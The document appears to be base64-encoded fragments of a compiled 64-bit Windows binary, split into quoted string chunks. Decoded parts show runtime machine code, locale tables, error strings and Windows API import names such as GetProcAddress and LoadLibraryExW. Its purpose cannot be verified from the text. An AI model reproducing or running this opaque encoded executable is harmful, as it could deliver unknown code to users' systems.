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','Ag2QkIABIjUwk','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BOAAAAAAAAAHAAYQAtAEkATgAAAAAAAABnAHUALQBJAE4AAAAAAAAAdABhAC0ASQBOAAAAAAAAAHQAZQAtAEkATgAAAAAAAABrAG4ALQBJAE4AAAAAAAAAbQBsAC0ASQBOAAAAAAAAAG0AcgAtAEkATgAAAAAAAABzAGEALQBJAE4AAAAAAAAAbQBuAC0ATQBOAAAAAAAAAGMAeQAtAEcAQgAAAAAAAABnAGwALQBFAFMAAAAAAAAAawBvAGsALQBJAE4AAAAAAHMAeQByAC0AUwBZAAAAAABkAGkAdgAtAE0AVgAAAAAAcQB1AHoALQBCAE8AAAAAAG4AcwAtAFoAQQAAAAAAAABtAGkALQBOAFoAAAAAAAAAYQByAC0ASQBRAAAAAAAAAGQAZQAtAEMASAAAAAAAAABlAG4ALQBHAEIAAAAAAAAAZQBzAC0ATQBYAAAAAAAAAGYAcgAtAEIARQAAAAAAAABpAHQALQBDAEgAAAAAAAAAbgBsAC0AQgBFAAAAAAAAAG4AbgAtAE4ATwAAAAAAAABwAHQALQBQAFQAAAAAAAAAcwByAC0AUwBQAC0ATABhAHQAbgAAAAAAcwB2AC0ARgBJAAAAAAAAAGEAegAtAEEAWgAtAEMAeQByAGwAAAAAAHMAZQAtAFMARQAAAAAAAABtAHMALQBCAE4AAAAAAAAAdQB6AC0AVQBaAC0AQwB5AHIAbAAAAAAAcQB1AHoALQBFAEMAAAAAAGEAcgAtAEUARwAAAAAAAAB6AGgALQBIAEsAAAAAAAAAZABlAC0AQQBUAAAAAAAAAGUAbgAtAEEAVQAAAAAAAABlAHMALQBFAFMAAAAAAAAAZgByAC0AQwBBAAAAAAAAAHMAcgAtAFMAUAAtAEMAeQByAGwA','AAAAAAAAAAAAAAABwZXJtaXNzaW9uIGRlbmllZAAAAAAAAABmaWxlIGV4aXN0cwAAAAAAbm8gc3VjaCBkZXZpY2UAAGZpbGVuYW1lIHRvbyBsb25nAAAAAAAAAGRldmljZSBvciByZXNvdXJjZSBidXN5AGlvIGVycm9yAAAAAAAAAABkaXJlY3Rvcnkgbm90IGVtcHR5AAA','Qcm9jZXNzb3JGZWF0dXJlUHJlc2VudABXAUV4aXRQcm9jZXNzAGwCR2V0TW9kdWxlSGFuZGxlRXhXAACkAkdldFByb2NBZGRyZXNzAADUA011bHRpQnl0ZVRvV2lkZUNoYXIA2wVXaWRlQ2hhclRvTXVsdGlCeXRlAEEDSGVhcFNpemUAADwDSGVhcEZyZWUAADgDSGVhcEFsbG9jABgFU2V0TGFzdEVycm9yAACpAkdldFByb2Nlc3NIZWFwAADHAkdldFN0ZEhhbmRsZQAARQJHZXRGaWxlVHlwZQAGAURlbGV0ZUNyaXRpY2FsU2VjdGlvbgDFAkdldFN0YXJ0dXBJbmZvVwBoAkdldE1vZHVsZUZpbGVOYW1lQQAAMARRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAQAkdldEN1cnJlbnRQcm9jZXNzSWQA3QJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQAuAkdldEVudmlyb25tZW50U3RyaW5nc1cAAKMBRnJlZUVudmlyb25tZW50U3RyaW5nc1cArQRSdGxDYXB0dXJlQ29udGV4dAC7BFJ0bFZpcnR1YWxVbndpbmQAAJAFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABQBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgBRA0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQAbgVUZXJtaW5hdGVQcm9jZXNzAACABVRsc0FsbG9jAACCBVRsc0dldFZhbHVlAIMFVGxzU2V0VmFsdWUAgQVUbHNGcmVlAG0CR2V0TW9kdWxlSGFuZGxlVwAAKQFFbnRlckNyaXRpY2FsU2VjdGlvbgAApQNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAaQJHZXRNb2R1bGVGaWxlTmFtZVcAAKoDTG9hZExpYnJhcnlFeFcAAHUDSXNWYWxpZENvZGVQYWdlAKoBR2V0QUNQAACNAkdldE9FTUNQAAC5AUdldENQSW5mbwA/A0hlYXBSZUFsbG9jAJkDTENNYXBTdHJpbmdXAADiAUdldENvbnNvbGVDUAAA9AFHZXRDb25zb2xlTW9kZQAACwVTZXRGaWxlUG9pbnRlckV4AAD9A091dHB1dERlYnVnU3RyaW5nVwAAzAJHZXRTdHJpbmdUeXB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